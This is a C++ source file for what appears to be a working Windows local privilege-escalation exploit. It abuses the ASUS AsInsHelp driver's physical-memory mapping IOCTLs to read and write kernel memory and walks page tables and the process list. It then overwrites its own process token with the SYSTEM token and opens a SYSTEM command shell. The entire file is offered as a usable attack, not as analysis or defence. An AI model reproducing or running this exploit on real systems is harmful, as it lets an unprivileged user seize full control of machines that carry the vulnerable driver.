#include <Windows.h>
#include <stdio.h>
#include <iostream>

// =============================================================
// Windows10 2004 ~ Windows11 23H2
// =============================================================
#define EPROCESS_PID_OFFSET     0x440
#define EPROCESS_LINKS_OFFSET   0x448
#define EPROCESS_TOKEN_OFFSET   0x4B8

#define ASUS_DEVICE_NAME        L"\\\\.\\AsInsHelp"
#define IOCTL_MAP_PHYSICAL      0xA040244C
#define IOCTL_UNMAP_PHYSICAL    0xA0402450
#define LARGE_PAGE_MASK         0x80

#pragma pack(push, 1)
typedef struct {
    ULONG64 UserVirtualAddress;
    ULONG64 PhysicalAddress;
    DWORD   junk2;
    DWORD   Size;
} AsInsHelp64_Map_Buffer;
#pragma pack(pop)

class AsusDriver {
private:
    HANDLE hDriver;

public:
    AsusDriver() : hDriver(INVALID_HANDLE_VALUE) {}

    bool Open() {
        hDriver = CreateFileW(ASUS_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDriver == INVALID_HANDLE_VALUE) {
            hDriver = CreateFileW(L"\\\\.\\AsInsHelp", GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        }
        return (hDriver != INVALID_HANDLE_VALUE);
    }

    void Close() { if (hDriver != INVALID_HANDLE_VALUE) CloseHandle(hDriver); }

    void* MapPhysical(ULONG64 physicalAddress, DWORD size) {
        AsInsHelp64_Map_Buffer buffer = { 0 };
        buffer.PhysicalAddress = physicalAddress;
        buffer.Size = size;
        DWORD bytesReturned = 0;
        DeviceIoControl(hDriver, IOCTL_MAP_PHYSICAL, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytesReturned, nullptr);
        return RecoverAddress((DWORD)buffer.UserVirtualAddress);
    }

    void* RecoverAddress(DWORD lowPart) {
        MEMORY_BASIC_INFORMATION mbi;
        ULONG64 address = 0;
        while (VirtualQuery((LPCVOID)address, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && ((ULONG64)mbi.BaseAddress & 0xFFFFFFFF) == lowPart) return mbi.BaseAddress;
            address += mbi.RegionSize;
            if (address > 0x7FFFFFFFFFFF) break;
        }
        return nullptr;
    }

    void UnmapPhysical(void* virtualAddress) {
        DWORD bytesReturned = 0;
        DeviceIoControl(hDriver, IOCTL_UNMAP_PHYSICAL, &virtualAddress, sizeof(void*), nullptr, 0, &bytesReturned, nullptr);
    }

    ULONG64 ReadPhys64(ULONG64 physAddr) {
        ULONG64 base = physAddr & 0xFFFFFFFFFFFFF000;
        DWORD offset = physAddr & 0xFFF;
        void* ptr = MapPhysical(base, 0x2000);
        if (!ptr) return 0;
        ULONG64 val = 0;
        __try { val = *(ULONG64*)((BYTE*)ptr + offset); }
        __except (1) { val = 0; }
        UnmapPhysical(ptr);
        return val;
    }

    void WritePhys64(ULONG64 physAddr, ULONG64 value) {
        ULONG64 base = physAddr & 0xFFFFFFFFFFFFF000;
        DWORD offset = physAddr & 0xFFF;
        void* ptr = MapPhysical(base, 0x2000);
        if (!ptr) return;
        __try { *(ULONG64*)((BYTE*)ptr + offset) = value; }
        __except (1) {}
        UnmapPhysical(ptr);
    }
};

ULONG64 Virt2Phys(AsusDriver& driver, ULONG64 dirBase, ULONG64 virtAddr) {
    ULONG64 pml4Index = (virtAddr >> 39) & 0x1FF;
    ULONG64 pdptIndex = (virtAddr >> 30) & 0x1FF;
    ULONG64 pdIndex = (virtAddr >> 21) & 0x1FF;
    ULONG64 ptIndex = (virtAddr >> 12) & 0x1FF;

    ULONG64 pml4Entry = driver.ReadPhys64(dirBase + pml4Index * 8);
    if (!(pml4Entry & 1)) return 0;

    ULONG64 pdptEntry = driver.ReadPhys64((pml4Entry & 0xFFFFFFFFFF000) + pdptIndex * 8);
    if (!(pdptEntry & 1)) return 0;
    if (pdptEntry & LARGE_PAGE_MASK) return (pdptEntry & 0xFFFFFC0000000) + (virtAddr & 0x3FFFFFFF);

    ULONG64 pdEntry = driver.ReadPhys64((pdptEntry & 0xFFFFFFFFFF000) + pdIndex * 8);
    if (!(pdEntry & 1)) return 0;
    if (pdEntry & LARGE_PAGE_MASK) return (pdEntry & 0xFFFFFFFE00000) + (virtAddr & 0x1FFFFF);

    ULONG64 ptEntry = driver.ReadPhys64((pdEntry & 0xFFFFFFFFFF000) + ptIndex * 8);
    if (!(ptEntry & 1)) return 0;

    return (ptEntry & 0xFFFFFFFFFF000) + (virtAddr & 0xFFF);
}

ULONG64 ReadVirt64(AsusDriver& driver, ULONG64 dirBase, ULONG64 virtAddr) {
    ULONG64 phys = Virt2Phys(driver, dirBase, virtAddr);
    if (!phys) return 0;
    return driver.ReadPhys64(phys);
}

int main() {
    AsusDriver driver;
    if (!driver.Open()) {
        printf("[-] Failed to open driver.\n");
        system("pause");
        return 1;
    }

    printf("\n[STEP 1] Input SYSTEM Process Info from WinDbg\n");
    printf("    Command: !process 0 0 System\n");

    ULONG64 sysEprocess = 0;
    printf("    Input 'PROCESS' Address (Hex): ");
    scanf_s("%llx", &sysEprocess);

    ULONG64 sysCr3 = 0;
    printf("    Input 'DirBase' (CR3) (Hex): ");
    scanf_s("%llx", &sysCr3);

    ULONG64 sysToken = 0;
    printf("\n[STEP 2] Input SYSTEM Token Value\n");
    printf("    -------------------------------------------\n");
    printf("    Command: dq %llx+4b8 L1\n", sysEprocess);
    printf("    -------------------------------------------\n");
    printf("    Input Token Value (Hex, Right side value): ");
    scanf_s("%llx", &sysToken);

    if (!sysEprocess || !sysCr3 || !sysToken) {
        printf("[-] Invalid Input.\n");
        return 1;
    }

    printf("\n[STEP 3] Walking ActiveProcessLinks...\n");

    DWORD myPid = GetCurrentProcessId();
    ULONG64 currentEProcess = sysEprocess;
    bool found = false;

    for (int i = 0; i < 2000; i++) {
        ULONG64 pid = ReadVirt64(driver, sysCr3, currentEProcess + EPROCESS_PID_OFFSET);

        if ((DWORD)pid == myPid) {
            printf("[+] FOUND MY PROCESS (PID: %lld)!\n", pid);
            printf("    EPROCESS: 0x%llX\n", currentEProcess);

            ULONG64 tokenPhys = Virt2Phys(driver, sysCr3, currentEProcess + EPROCESS_TOKEN_OFFSET);
            if (tokenPhys) {
                printf("    Target Token Phys: 0x%llX\n", tokenPhys);
                printf("[*] Overwriting with System Token...\n");
                driver.WritePhys64(tokenPhys, sysToken);

                printf("[+] SUCCESS!\n");
                system("cmd.exe");
                found = true;
            }
            else {
                printf("[-] Failed to resolve Token physical address.\n");
            }
            break;
        }

        ULONG64 listEntry = ReadVirt64(driver, sysCr3, currentEProcess + EPROCESS_LINKS_OFFSET);
        if (!listEntry || listEntry == sysEprocess + EPROCESS_LINKS_OFFSET) break;

        currentEProcess = listEntry - EPROCESS_LINKS_OFFSET;
    }

    if (!found) {
        printf("[-] Failed to find my process in the list.\n");
    }

    driver.Close();
    system("pause");
    return 0;
}